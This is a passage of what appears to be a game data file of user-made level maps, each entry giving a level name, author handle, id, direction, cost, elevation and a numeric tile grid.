81,81,81,81,81,81,81,81,81,81,81,81,1,1,81,81,81,44,44,81,81,81,81,81,81,44,44,81,81,81,81,81,1,1,81,81,81,44,44,81,81,81,81,81,81,44,44,81,81,81,81,81,1,1,81,81,81,81,81,81,81,81,81,81,81,44,44,81,81,81,81,81,1,1,44,44,44,81,81,81,81,81,81,81,81,81,81,81,44,44,44,44,1,1,44,93,44,81,81,81,81,81,81,81,81,81,81,81,44,44,44,44,1,1,97,44,44,81,81,81,81,81,81,81,81,81,81,81,44,44,44,96,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2]});
maps.push({name="lava land",author="issic",id="#1650682142",direction="right",cost=299,elevation=-7,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,77,0,0,0,0,0,0,21,21,0,0,0,0,0,0,77,0,0,0,97,24,77,0,0,0,0,0,22,22,0,0,0,0,0,77,24,97,0,0,0,77,0,0,0,0,0,0,23,23,0,0,0,0,0,0,77,0,0,0,0,44,0,0,0,0,0,92,24,24,92,0,0,0,0,0,44,0,0,0,0,0,0,0,0,0,0,96,24,24,96,0,0,0,0,0,0,0,0,0,99,44,0,0,0,98,0,77,96,96,0,0,77,77,77,77,77,0,0,0,0,0,24,24,98,24,24,76,24,24,0,77,1,1,1,1,1,77,0,0,0,0,24,24,98,24,24,76,24,76,77,0,77,77,77,77,77,100,0,0,0,0,24,24,0,98,0,77,0,77,77,0,51,51,51,51,37,37,0,0,0,77,76,76,77,0,0,0,0,0,0,0,51,51,0,51,0,38,0,0,0,0,24,24,0,0,0,0,0,0,17,17,51,51,0,51,0,39,0,0,0,0,24,24,0,101,0,0,0,0,17,77,51,51,0,3,0,40,0,0,0,0,24,24,24,24,101,24,22,20,18,16,14,14,14,14,14,14,2,0,0,24,24,24,24,24,101,24,22,20,18,16,14,14,14,14,85,14,2,0,0,24,0,0,0,101,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,77,0,0,0,0,0,77,77,77,77,0,0,0,0,0,77,0,0,0,102,24,77,0,0,0,77,1,1,1,1,77,0,0,0,77,14,100,0,0,0,77,0,0,0,0,0,77,77,77,77,0,0,0,0,0,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Get The Buttons",author="DankArab",id="#1650682848",direction="forward",cost=436,elevation=18,map=[24,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,2,2,24,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,64,64,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,64,64,64,64,90,64,64,64,64,64,64,90,64,64,64,90,64,99,1,1,64,90,64,64,87,64,90,64,64,64,64,64,64,64,64,64,64,64,1,1,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,90,64,64,1,1,64,64,64,90,64,64,64,64,87,64,90,64,64,90,64,64,64,64,1,1,64,90,64,64,64,90,64,64,64,64,64,64,87,64,64,64,64,64,1,1,64,64,64,64,64,64,64,64,64,64,64,64,64,64,90,64,64,64,1,1,64,64,64,64,64,64,64,64,64,90,64,64,64,64,64,64,90,64,1,1,64,64,90,64,87,64,90,64,64,64,64,64,64,64,64,64,64,64,1,1,64,64,64,64,64,64,64,64,64,64,64,64,90,64,64,64,64,64,1,1,64,90,64,64,64,64,64,90,64,64,64,64,64,64,64,87,64,64,1,1,64,64,64,90,64,64,64,64,64,64,64,64,90,64,64,64,64,64,1,1,64,64,64,64,64,64,64,64,64,90,64,64,64,64,64,64,64,64,1,1,64,87,64,64,64,87,90,64,64,64,64,64,64,64,64,64,64,64,1,1,64,64,90,64,64,64,64,64,64,64,87,64,90,64,64,64,64,64,1,1,64,64,64,64,64,64,64,90,64,64,64,64,64,64,64,64,96,96,1,1,97,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,96,98,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2]});
maps.push({name="up or down",author="blasian",id="#1650684347",direction="forward",cost=140,elevation=12,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,93,85,0,12,3,0,0,5,4,5,5,4,5,0,0,0,0,0,0,0,97,47,90,47,47,47,47,12,12,47,95,12,0,0,0,0,0,0,0,0,0,47,47,7,47,47,85,47,47,47,47,47,0,0,0,0,0,0,0,0,0,47,47,47,47,47,47,47,47,3,47,93,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,33,33,33,0,0,0,0,0,0,0,0,0,3,47,47,0,0,0,0,0,33,33,33,0,0,0,0,0,0,0,0,0,12,47,47,0,0,0,0,0,33,33,33,0,0,0,0,0,0,0,0,0,0,47,47,47,47,47,33,98,33,90,90,0,0,0,0,0,0,0,0,0,0,47,47,47,47,92,33,98,33,90,99,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="trust",author="blasian",id="#1650685186",direction="forward",cost=164,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,96,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,99,5,5,5,96,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,5,5,0,0,0,25,25,25,0,97,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,5,5,5,0,0,0,0,98,98,0,0,0,0,0,0,5,5,0,0,0,95,95,95,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,95,95,95,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,95,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,95,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,95,0,0,0,0,0,5,5,0,0,0,0,0,0,85,5,5,5,5,101,5,5,103,5,5,5,85,5,0,0,0,0,0,0,5,5,5,5,5,101,5,5,103,5,5,5,5,5,0,0,0,0,0,0,0,104,0,0,0,0,100,5,0,0,0,102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="agility or strength",author="blasian",id="#1650685510",direction="left",cost=52,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,91,90,91,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,90,91,90,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="slip n slide",author="issic",id="#1650686009",direction="left",cost=262,elevation=15,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,9,9,9,14,14,14,14,9,70,9,0,0,0,0,0,0,0,0,0,0,9,97,9,66,69,69,69,66,71,9,0,0,0,0,0,0,0,0,0,0,9,9,9,14,14,14,14,9,71,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,9,71,9,0,0,0,0,0,0,0,0,0,0,0,0,15,13,11,9,96,9,71,9,0,0,0,0,0,0,0,0,0,0,0,15,15,13,11,9,96,9,71,9,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,16,71,16,16,17,18,0,0,0,0,0,0,0,0,15,15,0,0,0,16,16,71,16,16,17,18,19,0,0,0,0,0,0,67,73,74,67,0,67,16,16,71,16,16,67,19,19,0,0,0,0,0,0,0,15,15,71,16,71,16,16,71,16,67,21,20,20,0,0,0,0,0,0,0,15,15,71,16,71,24,24,71,23,22,21,21,0,0,0,0,0,0,2,24,24,24,71,24,71,24,24,71,23,22,22,0,0,0,0,0,0,0,2,24,24,24,71,24,71,24,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,24,67,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,67,0,67,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,24,71,24,71,24,24,71,24,24,100,0,0,0,0,0,0,0,0,0,0,24,72,24,72,24,24,72,24,24,0,0,0,0,0,0,0,0,0,0,0,0,67,0,67,0,0,67,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="well deserved break",author="blasian",id="#1650686389",direction="left",cost=34,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,2,5,5,95,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,2,5,5,95,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="falls",author="pasas",id="#1650686701",direction="forward",cost=460,elevation=0,map=[0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,12,12,12,12,1,1,0,0,0,0,0,5,5,5,5,5,5,5,7,76,76,92,92,76,76,7,5,5,5,5,5,76,76,76,76,76,76,76,77,76,76,76,76,76,76,77,76,76,76,76,76,76,76,76,76,76,76,76,77,76,76,76,76,76,76,77,76,76,76,76,76,76,76,76,76,76,76,76,77,76,76,76,76,76,76,77,76,76,76,76,76,76,76,76,76,76,76,76,77,76,76,76,76,76,76,77,76,76,76,76,76,76,76,76,76,76,76,76,77,76,76,76,76,76,76,77,76,76,76,76,76,5,5,5,5,5,5,5,7,76,76,76,76,76,76,7,5,5,5,5,5,0,0,0,0,0,0,0,1,1,12,12,12,12,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,91,91,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,91,91,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0]});
maps.push({name="Multi side defending",author="Temmie",id="#1650687463",direction="forward",cost=236,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,10,70,70,11,11,70,70,10,0,0,0,0,0,0,0,0,0,0,0,0,10,71,71,12,12,71,71,10,0,0,0,0,0,0,0,0,0,0,0,0,10,71,71,13,13,71,71,10,0,0,0,0,0,0,0,28,27,0,0,30,10,71,71,14,14,71,71,10,30,0,0,27,28,0,0,28,27,0,0,30,10,71,71,14,14,71,71,10,30,0,0,27,28,0,0,0,0,0,0,0,10,71,71,13,13,71,71,10,0,0,0,0,0,0,0,28,0,0,0,0,10,71,71,12,12,71,71,10,0,0,0,0,28,0,0,0,0,0,0,0,10,71,71,11,11,71,71,10,0,0,0,0,0,0,0,28,0,0,0,0,10,10,10,10,10,10,10,10,0,0,0,0,28,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,28,0,0,0,0,0,0,96,10,10,96,0,0,0,0,0,0,28,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,28,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,28,0,0,29,0,0,0,0,0,0,0,85,10,0,0,0,0,0,0,0,29,0,0,30,0,0,0,0,96,0,0,10,85,0,0,96,0,0,0,0,30,0,0,30,85,30,0,30,30,96,10,10,10,10,96,30,30,0,30,85,30,0,0,91,0,0,0,0,96,0,0,10,10,0,0,96,0,0,0,0,91,0,0,97,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,97,0,0]});
maps.push({name="Lava and Water",author="fantasy",id="#1650687537",direction="forward",cost=432,elevation=11,map=[0,0,0,0,0,0,0,0,0,2,2,0,67,24,24,24,24,24,24,24,0,12,12,12,12,12,12,12,12,12,12,0,67,67,67,67,67,67,24,24,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,67,67,0,12,0,0,67,67,67,67,67,67,67,67,67,67,67,67,0,0,0,0,0,12,12,92,54,55,56,57,58,59,59,58,57,56,55,54,65,12,12,12,0,12,12,92,54,55,56,57,58,59,59,58,57,56,55,54,65,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,0,0,77,77,77,77,77,77,77,77,77,77,77,77,77,77,0,0,12,0,0,0,19,20,21,22,23,23,24,24,23,23,22,21,20,19,0,0,12,12,13,14,54,55,56,57,58,58,59,59,58,58,57,56,55,54,14,13,12,12,13,14,54,55,56,57,58,58,59,59,58,58,57,56,55,54,14,13,12,12,0,0,19,20,21,22,23,23,24,24,23,23,22,21,20,19,0,0,0,12,0,0,77,77,77,77,77,77,77,77,77,77,77,77,77,77,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,92,54,55,56,57,58,59,59,58,57,56,55,54,65,12,12,12,12,12,12,92,54,55,56,57,58,59,59,58,57,56,55,54,65,12,12,12,0,0,0,0,67,67,67,67,67,67,67,67,67,67,67,67,0,0,0,12,77,77,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,24,24,77,77,77,77,77,77,0,23,23,23,23,22,22,21,21,20,20,19,24,24,24,24,24,24,24,77,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Unlucky",author="DankArab",id="#1650689277",direction="forward",cost=382,elevation=17,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,6,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,8,94,8,94,8,94,8,94,8,94,8,94,8,94,8,94,8,94,8,8,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,10,94,10,94,10,94,10,94,10,94,10,94,10,94,10,94,10,94,10,10,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,12,94,12,94,12,94,12,94,12,94,12,94,12,94,12,94,12,94,12,12,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,14,94,14,94,14,94,14,94,14,94,14,94,14,94,14,94,14,94,14,14,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,16,94,16,94,16,94,16,94,16,94,16,94,16,94,16,94,16,94,16,16,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,18,94,18,94,18,94,18,94,18,94,18,94,18,94,18,94,18,94,18,18,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,20,94,20,94,20,94,20,94,20,94,20,94,20,94,20,94,20,94,20,20,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,22,94,22,94,22,94,22,94,22,94,22,94,22,94,22,94,22,94,22,22,23,23,23,23,23,23,23,23,2,2,23,23,23,23,23,23,23,23,23,23]});
maps.push({name="Descent into Madness",author="fantasy",id="#1650689378",direction="right",cost=293,elevation=-2,map=[1,18,17,0,15,14,13,13,0,1,0,0,13,0,0,1,0,2,2,0,1,18,17,0,15,14,13,13,1,0,13,0,0,0,13,0,0,7,7,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,19,19,0,0,0,1,0,13,13,0,0,1,0,11,0,0,7,7,0,0,19,19,0,0,0,0,1,0,0,1,0,0,0,11,0,0,7,7,0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,10,10,0,7,1,0,0,19,19,0,0,0,77,0,0,0,0,0,0,0,10,10,0,8,0,0,0,0,0,0,0,77,24,77,0,0,0,0,0,0,0,0,1,0,0,0,0,0,40,0,0,0,77,0,0,0,77,0,0,1,1,1,1,0,0,0,40,40,40,0,0,0,0,0,0,77,22,77,0,16,16,18,18,1,0,0,40,0,0,0,0,0,0,0,0,0,77,0,0,12,12,14,14,21,1,0,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,22,1,40,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,1,1,40,40,40,39,38,37,36,35,34,33,32,31,30,29,28,27,26,25,25,2,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,1,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,22,1,0,0,0,0,0,77,0,0,0,0,77,0,0,12,12,14,14,21,1,0,77,77,77,0,77,23,77,0,0,77,19,77,0,16,16,18,18,1,0,0,24,24,24,0,0,77,0,0,0,0,77,0,0,1,1,1,1,0,0,0]});
maps.push({name="Head Bumper",author="DankArab",id="#1650691332",direction="left",cost=84,elevation=0,map=[0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,45,45,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,47,47,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,49,49,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,51,51,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,53,53,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,55,55,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,57,57,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,59,59,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,61,61,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,63,63,1,0,0,0,0,0,0,0,0,0,2,45,46,49,52,55,58,61,64,64,1,0,0,0,0,0,0,0,0,0,2,45,46,49,52,55,58,61,64,64,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Watch your step",author="Bomberman",id="#1650696754",direction="left",cost=317,elevation=6,map=[100,91,86,16,93,1,1,1,1,1,1,1,1,1,0,1,2,2,1,0,0,85,16,86,1,0,14,14,14,14,14,13,13,13,1,0,10,10,10,1,0,86,76,16,0,0,14,14,14,14,14,13,13,13,1,0,85,10,10,1,0,91,91,16,0,0,14,14,14,86,14,13,13,13,1,0,10,10,85,1,0,16,16,85,0,0,14,14,14,0,0,12,12,12,0,0,10,10,10,1,0,85,16,16,0,0,18,18,14,0,0,12,12,12,0,0,10,10,85,1,0,88,85,86,0,0,14,14,14,0,0,12,90,12,0,0,85,10,10,1,1,16,16,16,0,0,14,18,18,0,0,12,12,12,0,0,10,10,10,1,2,16,16,16,0,0,14,14,14,0,0,12,12,90,0,0,10,85,10,1,2,16,16,16,0,0,18,18,14,0,0,90,12,90,0,0,85,10,10,1,1,16,16,16,0,0,14,14,14,0,0,12,12,12,0,0,10,10,10,1,0,16,16,16,0,0,14,18,18,0,0,12,90,12,0,0,10,85,10,1,0,1,95,1,0,0,14,14,14,0,0,90,12,12,0,0,10,10,85,1,1,16,16,16,1,1,14,14,14,1,0,12,12,12,0,0,10,10,10,1,0,16,16,16,0,0,1,95,1,0,0,12,12,12,0,0,10,86,10,1,0,85,16,16,0,0,14,14,14,0,0,12,12,12,0,0,10,10,10,1,0,16,16,16,16,16,15,15,15,1,0,12,12,12,12,12,11,11,11,1,0,16,16,16,16,16,15,15,15,1,0,12,12,12,12,12,11,11,11,1,0,16,16,16,86,16,15,15,15,1,0,12,12,12,12,12,11,11,11,1,0,1,1,1,1,1,1,1,1,0,0,1,1,1,1,1,1,1,1,0]});
maps.push({name="shiny button",author="Fara",id="#1650711246",direction="right",cost=191,elevation=1,map=[0,0,0,0,0,0,0,35,2,2,35,35,0,0,0,0,0,0,0,0,0,0,0,0,35,35,0,35,35,35,35,35,0,0,35,35,0,0,0,0,0,0,0,0,35,35,0,35,35,35,35,35,0,0,35,36,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,0,0,0,0,0,0,0,0,0,35,35,0,0,0,0,35,35,35,35,35,0,0,0,0,0,0,0,0,0,35,35,0,0,0,1,35,35,35,35,35,1,0,0,0,0,35,35,0,0,0,0,0,0,0,1,96,96,96,96,96,1,0,0,0,0,36,36,0,0,0,0,0,0,0,1,35,35,35,35,35,1,0,0,0,0,0,0,0,0,35,35,0,0,0,0,35,36,36,36,35,0,0,0,0,0,0,0,0,0,35,35,0,0,0,0,35,36,97,36,35,0,0,0,35,35,0,0,0,0,0,0,0,0,0,0,35,36,36,36,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,0,35,0,0,0,0,0,0,0,35,35,0,0,0,0,35,35,35,35,35,0,0,0,0,0,0,0,0,0,35,35,0,0,0,0,35,35,35,35,35,35,35,35,35,35,35,35,35,0,0,0,0,0,0,0,35,36,36,36,35,34,34,34,35,36,36,36,35,0,0,0,0,35,35,0,35,36,37,36,35,34,33,34,35,36,37,36,2,0,0,0,0,35,35,0,35,36,37,36,35,34,33,34,35,36,37,36,2,0,0,0,0,0,0,0,35,36,36,36,35,34,34,34,35,36,36,36,35,0,0,0,0,0,0,0,35,35,35,35,35,35,35,35,35,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="mild overdefense",author="Fara",id="#1650711302",direction="left",cost=211,elevation=7,map=[0,99,0,0,1,0,0,0,17,2,2,17,0,0,0,0,0,0,0,0,0,37,37,37,96,37,37,0,17,17,17,17,0,0,0,44,0,44,0,0,0,37,37,37,96,37,37,0,17,17,17,17,0,44,0,0,0,0,0,0,0,99,0,0,1,0,0,0,17,17,17,17,0,0,0,0,0,0,44,0,0,0,0,0,0,0,0,1,95,95,95,95,1,44,0,0,0,0,102,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,0,0,0,17,17,17,17,0,44,0,17,0,0,0,0,0,97,17,0,0,0,17,0,17,17,17,17,0,17,0,0,0,17,97,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,98,98,98,98,1,0,44,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,95,95,1,0,0,44,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,0,0,0,0,0,44,0,0,0,0,0,0,0,0,0,0,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,0,0,0,0,44,0,0,0,0,0,0,0,0,0,0,0,4,4,4,4,0,0,0,0,0,0,44,0,0,0,1,104,0,1,0,0,44,44,44,44,0,0,1,1,0,0,0,0,2,44,101,44,44,95,44,44,44,44,44,44,44,44,103,95,44,44,0,0,2,44,101,44,44,95,44,44,44,44,44,44,44,44,103,95,44,44,0,0,0,0,1,104,0,1,0,0,44,44,44,44,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="CSO",author="CSO",id="#1650717031",direction="forward",cost=399,elevation=-18,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,23,66,66,66,66,66,66,66,66,66,66,66,23,0,0,0,0,0,0,0,22,66,66,66,66,66,66,66,66,66,66,66,22,0,0,0,0,0,0,0,21,66,66,21,21,21,21,21,21,21,66,66,21,0,0,0,0,0,0,0,20,66,66,20,20,20,20,20,20,20,66,66,20,0,0,0,0,0,0,0,19,66,66,19,19,19,19,19,19,19,66,66,19,0,0,0,0,0,0,0,18,67,67,18,18,18,18,18,18,18,67,67,18,0,0,0,0,24,0,0,17,66,66,66,66,66,66,17,17,17,66,66,17,0,0,0,0,0,0,0,16,66,66,66,66,66,66,16,16,16,66,66,16,0,0,0,0,0,0,0,15,66,66,15,15,66,66,15,15,15,66,66,15,0,0,0,0,0,0,0,14,66,66,14,14,66,66,66,66,66,66,66,14,0,0,0,0,24,0,0,13,66,66,13,13,66,66,66,66,66,66,66,13,0,0,0,0,0,0,0,12,67,67,12,12,67,67,67,67,67,67,67,12,0,0,0,0,0,0,0,11,66,66,66,66,66,66,66,66,66,66,66,11,0,0,0,0,0,0,0,10,66,66,66,66,66,66,66,66,66,66,66,10,0,0,0,0,0,0,0,9,66,66,9,9,9,9,9,9,9,66,66,9,0,0,0,0,0,0,0,8,66,66,66,66,66,66,66,66,66,66,66,8,0,0,0,0,0,0,0,7,66,66,66,66,66,66,66,66,66,66,66,7,0,0,0,0,0,0,0,6,6,6,6,2,2,6,6,6,6,6,6,6,0,0,0,0]});
